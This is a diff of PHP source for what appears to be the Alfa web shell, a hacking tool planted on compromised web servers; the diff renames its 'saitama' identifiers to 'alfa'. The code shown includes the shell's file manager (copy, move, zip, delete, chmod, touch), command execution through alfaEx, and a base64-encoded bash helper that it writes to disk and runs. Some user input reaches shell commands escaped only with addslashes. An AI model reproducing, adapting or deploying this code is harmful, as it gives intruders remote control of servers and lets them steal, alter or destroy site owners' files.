+$zipX = "alfa_".rand(1,1000).".zip";
 if($zip->open($zipX, 1)){
-@chdir($_COOKIE['saitama_c']);
-foreach($_COOKIE['saitama_f'] as $f){
+@chdir($_COOKIE['alfa_c']);
+foreach($_COOKIE['alfa_f'] as $f){
 if($f == '..')continue;
-if(@is_file($_COOKIE['saitama_c'].$f))
-$zip->addFile($_COOKIE['saitama_c'].$f, $f);
-elseif(@is_dir($_COOKIE['saitama_c'].$f)){
+if(@is_file($_COOKIE['alfa_c'].$f))
+$zip->addFile($_COOKIE['alfa_c'].$f, $f);
+elseif(@is_dir($_COOKIE['alfa_c'].$f)){
 $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/'));
 foreach($iterator as $key=>$value){
 $key = str_replace('\\','/',realpath($key));
@@ -2734,21 +2735,21 @@ if(in_array(substr($key, strrpos($key,'/')+1),array('.', '..')))continue;
 @chdir($GLOBALS['cwd']);
 $zip->close();
 __alert('>> '.$zipX.' << is created...');}}
-}elseif($_COOKIE['saitama_act'] == 'unzip'&&isset($_COOKIE['saitama_f'])){
+}elseif($_COOKIE['alfa_act'] == 'unzip'&&isset($_COOKIE['alfa_f'])){
 if(class_exists('ZipArchive')){
 $zip = new ZipArchive();
-foreach($_COOKIE['saitama_f'] as $f) {
-if($zip->open($_COOKIE['saitama_c'].$f)){
-$zip->extractTo($_COOKIE['saitama_cwd']);
+foreach($_COOKIE['alfa_f'] as $f) {
+if($zip->open($_COOKIE['alfa_c'].$f)){
+$zip->extractTo($_COOKIE['alfa_cwd']);
 $zip->close();}}}}
-unset($_COOKIE['saitama_f']);
+unset($_COOKIE['alfa_f']);
 break;
 default:
-if(!empty($_POST['saitama1'])){
-if(in_array($_POST['saitama1'], array("copy", "move", "zip", "unzip"))){
-__saitama_set_cookie('saitama_act', @$_POST['saitama1']);
-__saitama_set_cookie('saitama_f', @serialize($_POST['f']));
-__saitama_set_cookie('saitama_c', @$_POST['c']);
+if(!empty($_POST['alfa1'])){
+if(in_array($_POST['alfa1'], array("copy", "move", "zip", "unzip"))){
+__alfa_set_cookie('alfa_act', @$_POST['alfa1']);
+__alfa_set_cookie('alfa_f', @serialize($_POST['f']));
+__alfa_set_cookie('alfa_c', @$_POST['c']);
 return;
 }
 }
@@ -2763,16 +2764,16 @@ if(preg_match("#(.*)\/\.\.#", $_POST['c'], $res)){
 }
 $cmd_dir = false;
 if($dirContent === false){
-	if(_saitama_can_runCommand(true,true)){
-		$tmp_getdir_path = @$_COOKIE["saitamachdir_bash_path"];
+	if(_alfa_can_runCommand(true,true)){
+		$tmp_getdir_path = @$_COOKIE["alfachdir_bash_path"];
 		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
-		if(!isset($_COOKIE["saitamachdir_bash"])||@!file_exists($tmp_getdir_path."/saitamacgiapi/getdir.saitama")){
+		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/alfacgiapi/getdir.alfa")){
 			$bash = "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
-			$tmp_getdir_path = saitamaWriteTocgiapi("getdir.saitama",$bash);
-			__saitama_set_cookie("saitamachdir_bash", "true");
-			__saitama_set_cookie("saitamachdir_bash_path", $tmp_getdir_path);
+			$tmp_getdir_path = alfaWriteTocgiapi("getdir.alfa",$bash);
+			__alfa_set_cookie("alfachdir_bash", "true");
+			__alfa_set_cookie("alfachdir_bash_path", $tmp_getdir_path);
 		}
-		$dirContent = saitamaEx("cd ".$tmp_getdir_path."/saitamacgiapi;sh getdir.saitama '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
+		$dirContent = alfaEx("cd ".$tmp_getdir_path."/alfacgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
 		$dirContent = json_decode($dirContent, true);
 		if(is_array($dirContent)){
 			array_pop($dirContent);
@@ -2782,56 +2783,56 @@ if($dirContent === false){
 		}
 	}
 }
-saitamahead();
-saitamaNum(8,9,10,7,6,5,4);
+alfahead();
+AlfaNum(8,9,10,7,6,5,4);
 $count_dirContent = @count($dirContent);
 if($count_dirContent > 300){
-	@$_COOKIE["saitama_limited_files"] = 100;
+	@$_COOKIE["alfa_limited_files"] = 100;
 }
-$saitama_sort_by = isset($_COOKIE["saitama_sort_by"]) ? $_COOKIE["saitama_sort_by"] : 'name';
-$saitama_limited_files = isset($_COOKIE["saitama_limited_files"]) ? (int)$_COOKIE["saitama_limited_files"] : 0;
-$saitama_files_page_number = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 1;
-$saitama_filesman_direction = isset($_COOKIE["saitama_filesman_direction"]) ? $_COOKIE["saitama_filesman_direction"] : 'asc';
+$alfa_sort_by = isset($_COOKIE["alfa_sort_by"]) ? $_COOKIE["alfa_sort_by"] : 'name';
+$alfa_limited_files = isset($_COOKIE["alfa_limited_files"]) ? (int)$_COOKIE["alfa_limited_files"] : 0;
+$alfa_files_page_number = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 1;
+$alfa_filesman_direction = isset($_COOKIE["alfa_filesman_direction"]) ? $_COOKIE["alfa_filesman_direction"] : 'asc';
 $files_page_count = 1;
-if($saitama_limited_files > 0){
-	$files_page_count = ceil($count_dirContent/$saitama_limited_files);
+if($alfa_limited_files > 0){
+	$files_page_count = ceil($count_dirContent/$alfa_limited_files);
 	if($files_page_count > 1){
 		$files_page_count++;
 	}
 }
-echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#00ffff;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'saitama_sort_by\');" style="color:#00ffff;"><option value="name" '.($saitama_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($saitama_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($saitama_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'saitama_filesman_direction\')" style="color:#00ffff;"><option value="asc" '.($saitama_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($saitama_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#00ffff;" type="text" name="limited_number" value="'.$saitama_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'saitama_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#00ffff;">'.($count_dirContent-1).'</b></span></div><div class="header">';
+echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#25ff00;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'alfa_sort_by\');" style="color:#25ff00;"><option value="name" '.($alfa_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($alfa_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($alfa_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'alfa_filesman_direction\')" style="color:#25ff00;"><option value="asc" '.($alfa_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($alfa_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#25ff00;" type="text" name="limited_number" value="'.$alfa_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'alfa_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#25ff00;">'.($count_dirContent-1).'</b></span></div><div class="header">';
 if($dirContent == false){
 echo '<center><br><span style="font-size:16px;"><span style="color: red; -webkit-text-shadow: 1px 1px 13px;"><strong><b><big>!!! Access Denied !!!</b></big><br><br></strong></div>';
-saitamaFooter();
+alfaFooter();
 return;
 }
 global $sort;
 $sort = array('name', 1);
-if(isset($_COOKIE["saitama_sort_by"]) && !empty($_COOKIE["saitama_sort_by"])){
-	$sort[0] = $_COOKIE["saitama_sort_by"];
+if(isset($_COOKIE["alfa_sort_by"]) && !empty($_COOKIE["alfa_sort_by"])){
+	$sort[0] = $_COOKIE["alfa_sort_by"];
 }
-if(!empty($_POST['saitama1'])) {
-if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['saitama1'], $match))
+if(!empty($_POST['alfa1'])) {
+if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['alfa1'], $match))
 $sort = array($match[1], (int)$match[2]);
 }
-if($saitama_files_page_number > ($files_page_count-1)){
-	$saitama_files_page_number = 1;
+if($alfa_files_page_number > ($files_page_count-1)){
+	$alfa_files_page_number = 1;
 }
 $checkbox_rand = rand(11111, 99999);
 echo "<form onsubmit='fc(this);return false;' name='files' method='post'><table id='filemanager_table' width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk".$checkbox_rand."' onclick='checkBox(this);' class='chkbx'><label for='mchk".$checkbox_rand."'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
 $dirs = $files = array();
 $n = $count_dirContent;
-if($n > $saitama_limited_files && $saitama_limited_files > 0){
-	$n = ($saitama_limited_files * $saitama_files_page_number);
+if($n > $alfa_limited_files && $alfa_limited_files > 0){
+	$n = ($alfa_limited_files * $alfa_files_page_number);
 	if($n > $count_dirContent){
 		$n = $count_dirContent;
 	}
 }
 $i = 0;
-if($saitama_limited_files > 0 && $saitama_files_page_number > 1){
-	$i = $saitama_limited_files * ($saitama_files_page_number - 1);
+if($alfa_limited_files > 0 && $alfa_files_page_number > 1){
+	$i = $alfa_limited_files * ($alfa_files_page_number - 1);
 }
-$page_builder = get_pagination_links($saitama_files_page_number,$files_page_count -1);
+$page_builder = get_pagination_links($alfa_files_page_number,$files_page_count -1);
 $cmd_dir_backp = "";
 for(;$i<$n;$i++){
 if($cmd_dir){
@@ -2839,7 +2840,7 @@ $filename = $dirContent[$i]["name"];
 $file_owner = $dirContent[$i]["owner"];
 $file_group = $dirContent[$i]["group"];
 $file_modify = @date('Y-m-d H:i:s', $dirContent[$i]["modify"]);
-$file_perm = saitamaPermsColor(array("class"=>$dirContent[$i]["permcolor"],"num"=>$dirContent[$i]["permnum"],"human"=>$dirContent[$i]["permhuman"]),true);
+$file_perm = alfaPermsColor(array("class"=>$dirContent[$i]["permcolor"],"num"=>$dirContent[$i]["permnum"],"human"=>$dirContent[$i]["permhuman"]),true);
 $file_size = $dirContent[$i]["size"];
 if(substr($dirContent[$i]["name"], 0 ,1) == "/"){
 $file_path = $dirContent[$i]["name"];
@@ -2855,7 +2856,7 @@ $gr = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_get
 $file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($GLOBALS['cwd'].$filename):"????");
 $file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($GLOBALS['cwd'].$filename):"????");
 $file_modify = @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $filename));
-$file_perm = saitamaPermsColor($GLOBALS['cwd'].$filename);
+$file_perm = alfaPermsColor($GLOBALS['cwd'].$filename);
 $file_size = @filesize($GLOBALS['cwd'].$filename);
 $file_path = $GLOBALS['cwd'].$filename;
 }
@@ -2893,16 +2894,16 @@ $dirs[] = array_merge($tmp, array('type' => 'dir'));
 }
 }
 $GLOBALS['sort'] = $sort;
-function saitamaCmp($a, $b) {
+function alfaCmp($a, $b) {
 if($GLOBALS['sort'][0] != 'size')
 return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
 else
 return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
 }
-usort($files, "saitamaCmp");
-usort($dirs, "saitamaCmp");
-if(isset($_COOKIE["saitama_filesman_direction"])&& !empty($_COOKIE["saitama_filesman_direction"])){
-	if($_COOKIE["saitama_filesman_direction"] == 'desc'){
+usort($files, "alfaCmp");
+usort($dirs, "alfaCmp");
+if(isset($_COOKIE["alfa_filesman_direction"])&& !empty($_COOKIE["alfa_filesman_direction"])){
+	if($_COOKIE["alfa_filesman_direction"] == 'desc'){
 		$files = array_reverse($files);
 		$dirs = array_reverse($dirs);
 	}
@@ -2917,7 +2918,7 @@ $checkbox = 'checkbox_'.$checkbox_rand.$cc;
 $raw_name = rawurlencode($f['name']);
 $icon = $GLOBALS['DB_NAME']['show_icons']?'<img src="'.findicon($f['name'],$f['type']).'" width="30" height="30">':'';
 $style = $GLOBALS['DB_NAME']['show_icons']?'position:relative;display:inline-block;bottom:12px;':'';
-echo '<tr class="fmanager-row" id="tr_row_'.$cc.'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'.$raw_name.'" class="chkbx" id="'.$checkbox .'"><label for="'.$checkbox .'"></label></div></td><td id="td_row_'.$cc.'">'.$icon.'<div style="'.$style.'"><a row="'.$cc.'" id="id_'.$cc.'" class="main_name" onclick="'.(($f['type']=='file')?'editor(\''.$raw_name.'\',\'auto\',\'\',\'\',\'\',\''.$f['type'].'\');" href="#action=fileman&path='.$GLOBALS['cwd'].'&file='.$raw_name.'" fname="'.$raw_name.'" ftype="file" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'>'.($GLOBALS['cwd'].$f['name']==$GLOBALS['__file_path']?"<span class='shell_name' style='font-weight:unset;'>".$f['name']."</span>":htmlspecialchars($newname)):'g(\'FilesMan\',\''.$f['path'].'\');" href="#action=fileman&path='.$f['path'].'" fname="'.$raw_name.'" ftype="folder" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'><b>| ' . htmlspecialchars($f['name']) . ' |</b>').'</a></td></div><td><span style="font-weight:unset;" class="main_size">'.(($f['type']=='file')?(isset($f['link'])?'[L] ':'').saitamaSize($f['size']):$f['type']).'</span></td><td><span style="font-weight:unset;" class="main_modify">'.$f['modify'].'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'.$f['owner'].'/'.$f['group'].'</span></td><td><a id="id_chmode_'.$cc.'" href=javascript:void(0) onclick="editor(\''.$raw_name.'\',\'chmod\',\'\',\'\',\'\',\''.$f['type'].'\')">'.
+echo '<tr class="fmanager-row" id="tr_row_'.$cc.'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'.$raw_name.'" class="chkbx" id="'.$checkbox .'"><label for="'.$checkbox .'"></label></div></td><td id="td_row_'.$cc.'">'.$icon.'<div style="'.$style.'"><a row="'.$cc.'" id="id_'.$cc.'" class="main_name" onclick="'.(($f['type']=='file')?'editor(\''.$raw_name.'\',\'auto\',\'\',\'\',\'\',\''.$f['type'].'\');" href="#action=fileman&path='.$GLOBALS['cwd'].'&file='.$raw_name.'" fname="'.$raw_name.'" ftype="file" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'>'.($GLOBALS['cwd'].$f['name']==$GLOBALS['__file_path']?"<span class='shell_name' style='font-weight:unset;'>".$f['name']."</span>":htmlspecialchars($newname)):'g(\'FilesMan\',\''.$f['path'].'\');" href="#action=fileman&path='.$f['path'].'" fname="'.$raw_name.'" ftype="folder" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'><b>| ' . htmlspecialchars($f['name']) . ' |</b>').'</a></td></div><td><span style="font-weight:unset;" class="main_size">'.(($f['type']=='file')?(isset($f['link'])?'[L] ':'').alfaSize($f['size']):$f['type']).'</span></td><td><span style="font-weight:unset;" class="main_modify">'.$f['modify'].'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'.$f['owner'].'/'.$f['group'].'</span></td><td><a id="id_chmode_'.$cc.'" href=javascript:void(0) onclick="editor(\''.$raw_name.'\',\'chmod\',\'\',\'\',\'\',\''.$f['type'].'\')">'.
 $f['perms'].'</td><td><a id="id_rename_'.$cc.'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'rename\',\'\',\'\',\'\',\''.$f['type'].'\')">R</a> <a id="id_touch_'.$cc.'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'touch\',\'\',\'\',\'\',\''.$f['type'].'\')">T</a>'.(($f['type']=='file')?' <a id="id_edit_'.$cc.'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'edit\',\'\',\'\',\'\',\''.$f['type'].'\')">E</a> <a id="id_download_'.$cc.'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$raw_name.'\', \'download\')">D</a>':'').'<a id="id_delete_'.$cc.'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '.addslashes(rawurldecode($f['name'])).' # ?\'); chk ? g(\'FilesMan\',null,\'delete\', \''.$raw_name.'\') : \'\';"> X </a></td></tr>';
 $l = $l?0:1;
 $cc++;
@@ -2926,10 +2927,10 @@ echo "<tr id='filemanager_last_tr'><td colspan=7>
 <input type=hidden name=a value='FilesMan'>
 <input type=hidden name=c value='".htmlspecialchars(($GLOBALS['glob_chdir_false']?$_POST['c']:$GLOBALS['cwd']))."'>
 <input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
-<select id='tools_selector' name='saitama1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
+<select id='tools_selector' name='alfa1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
 <input type='submit' value=' '>
 </form></table><div class='pages-holder'><div class='pages-number'>".$page_builder."</div></div></div></div>";
-saitamafooter();
+alfafooter();
 }
 function get_pagination_links($current_page, $total_pages){
     $links = "";
@@ -2962,92 +2963,92 @@ function get_pagination_links($current_page, $total_pages){
     }
     return $links;
 }
-function saitamaFilesTools(){
-saitamahead();
+function alfaFilesTools(){
+alfahead();
 echo '<div class="filestools" style="height: 100%;">';
-if(isset($_POST['saitama1']))$_POST['saitama1'] = rawurldecode($_POST['saitama1']);
-$saitama1_decoded = $_POST['saitama1'];
+if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode($_POST['alfa1']);
+$alfa1_decoded = $_POST['alfa1'];
 $chdir_fals = false;
 if(!@chdir($_POST['c'])){
 	$chdir_fals = true;
-	$_POST['saitama1'] = $_POST["c"]."/".$_POST["saitama1"];
-	$saitama_canruncmd = _saitama_can_runCommand(true,true);
-	if($saitama_canruncmd){
-		$slashed_saitama1 = addslashes($_POST['saitama1']);
-		$file_info = explode(":", saitamaEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_saitama1.'"'));
-		$perm_color_class = saitamaEx("if [[ -w '".$slashed_saitama1."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_saitama1."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
+	$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
+	$alfa_canruncmd = _alfa_can_runCommand(true,true);
+	if($alfa_canruncmd){
+		$slashed_alfa1 = addslashes($_POST['alfa1']);
+		$file_info = explode(":", alfaEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_alfa1.'"'));
+		$perm_color_class = alfaEx("if [[ -w '".$slashed_alfa1."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_alfa1."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
 	}
 }
-if($_POST['saitama2'] == 'auto'){
-if(is_array(@getimagesize($_POST['saitama1']))){
-$_POST['saitama2'] = 'image';
+if($_POST['alfa2'] == 'auto'){
+if(is_array(@getimagesize($_POST['alfa1']))){
+$_POST['alfa2'] = 'image';
 }else{
-	$_POST['saitama2'] = 'view';
+	$_POST['alfa2'] = 'view';
 	if($chdir_fals){
-		if($saitama_canruncmd){
-			$mime = explode(":", saitamaEx("file --mime-type '".addslashes($_POST['saitama1'])."'"));
+		if($alfa_canruncmd){
+			$mime = explode(":", alfaEx("file --mime-type '".addslashes($_POST['alfa1'])."'"));
 			$mimetype = $mime[1];
 			if(!empty($mimetype)){
 				if(strstr($mimetype, "image")){
-					$_POST['saitama2'] = 'image';
+					$_POST['alfa2'] = 'image';
 				}
 			}
 		}
 	}
 }
 }
-if($_POST['saitama2'] == "rename" && !empty($_POST['saitama3']) && @is_writable($_POST['saitama1'])){$rename_cache = $_POST['saitama3'];}
-if(@$_POST['saitama2'] == 'mkfile'){
-$_POST['saitama1'] = trim($_POST['saitama1']);
-if($chdir_fals&&$saitama_canruncmd){
-	if(_saitama_is_writable($_POST["c"])){
-		saitamaEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($saitama1_decoded)."'");
-		$_POST['saitama2'] = "edit";
+if($_POST['alfa2'] == "rename" && !empty($_POST['alfa3']) && @is_writable($_POST['alfa1'])){$rename_cache = $_POST['alfa3'];}
+if(@$_POST['alfa2'] == 'mkfile'){
+$_POST['alfa1'] = trim($_POST['alfa1']);
+if($chdir_fals&&$alfa_canruncmd){
+	if(_alfa_is_writable($_POST["c"])){
+		alfaEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($alfa1_decoded)."'");
+		$_POST['alfa2'] = "edit";
 	}
 }
-if(!@file_exists($_POST['saitama1'])){
-$fp = @fopen($_POST['saitama1'], 'w');
+if(!@file_exists($_POST['alfa1'])){
+$fp = @fopen($_POST['alfa1'], 'w');
 if($fp){
-$_POST['saitama2'] = "edit";
+$_POST['alfa2'] = "edit";
 fclose($fp);
 }
 }else{
-$_POST['saitama2'] = "edit";
+$_POST['alfa2'] = "edit";
 }
 }
-if(!_saitama_file_exists(@$_POST['saitama1'])){
-echo __pre()."<center><p><div class=\"txtfont\"><font color='red'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('".$_POST['saitama4']."');</script>";
-saitamaFooter();
+if(!_alfa_file_exists(@$_POST['alfa1'])){
+echo __pre()."<center><p><div class=\"txtfont\"><font color='red'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('".$_POST['alfa4']."');</script>";
+alfaFooter();
 return;
 }
 if($chdir_fals){
 $filesize = $file_info[3];
 $uid["name"] = $file_info[1];
 $gid["name"] = $file_info[2];
-$permcolor = saitamaPermsColor(array("class"=>$perm_color_class,"num"=>$file_info[5],"human"=>$file_info[6]),true);
+$permcolor = alfaPermsColor(array("class"=>$perm_color_class,"num"=>$file_info[5],"human"=>$file_info[6]),true);
 }else{
-$uid = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['saitama1'])):'';
-$gid = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['saitama1'])):'';
+$uid = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['alfa1'])):'';
+$gid = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['alfa1'])):'';
 if(!$uid&&!$gid){
-$uid['name'] = function_exists("fileowner")?@fileowner($_POST['saitama1']):'';
-$gid['name'] = function_exists("filegroup")?@filegroup($_POST['saitama1']):'';
+$uid['name'] = function_exists("fileowner")?@fileowner($_POST['alfa1']):'';
+$gid['name'] = function_exists("filegroup")?@filegroup($_POST['alfa1']):'';
 }
-$permcolor = saitamaPermsColor($_POST['saitama1']);
-$filesize = @filesize($_POST['saitama1']);
+$permcolor = alfaPermsColor($_POST['alfa1']);
+$filesize = @filesize($_POST['alfa1']);
 if(!isset($uid['name'],$gid['name'])||empty($uid['name'])||empty($gid['name'])){
-	if(_saitama_can_runCommand()){
-		list($uid['name'],$gid['name']) = explode(":", saitamaEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["saitama1"]).'"'));
+	if(_alfa_can_runCommand()){
+		list($uid['name'],$gid['name']) = explode(":", alfaEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["alfa1"]).'"'));
 	}
 }
 }
-if(substr($_POST['saitama1'], 0, 7) == "phar://"){
-	$saitama_file_directory = $_POST['saitama1'];
+if(substr($_POST['alfa1'], 0, 7) == "phar://"){
+	$alfa_file_directory = $_POST['alfa1'];
 }else{
-	$saitama_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['saitama1']);
+	$alfa_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['alfa1']);
 }
-echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($saitama1_decoded)).' <span class="editor_file_info_vars">Size:</span> '.saitamaSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($saitama_file_directory).'</div>';
-if(empty($_POST['saitama2']))$_POST['saitama2'] = 'view';
-if(!_saitama_is_dir($_POST['saitama1'])){
+echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($alfa1_decoded)).' <span class="editor_file_info_vars">Size:</span> '.alfaSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($alfa_file_directory).'</div>';
+if(empty($_POST['alfa2']))$_POST['alfa2'] = 'view';
+if(!_alfa_is_dir($_POST['alfa1'])){
 $m = array('View', 'Download', 'Highlight', 'Chmod', 'Rename', 'Touch', 'Delete', 'Image', 'Hexdump');
 $ftype = "file";
 }else{
@@ -3056,86 +3057,86 @@ $ftype = "dir";
 }
 echo('<div>');
 foreach($m as $v)
-echo $v == 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes(!isset($rename_cache)?$_POST['saitama1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['saitama4'].'\',\''.$ftype.'\'):\'\';"><span class="editor_actions">'.((strtolower($v)==@$_POST['saitama2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes(!isset($rename_cache)?$_POST['saitama1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['saitama4'].'\',\''.$ftype.'\')"><span class="editor_actions">'.((strtolower($v)==@$_POST['saitama2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a>';
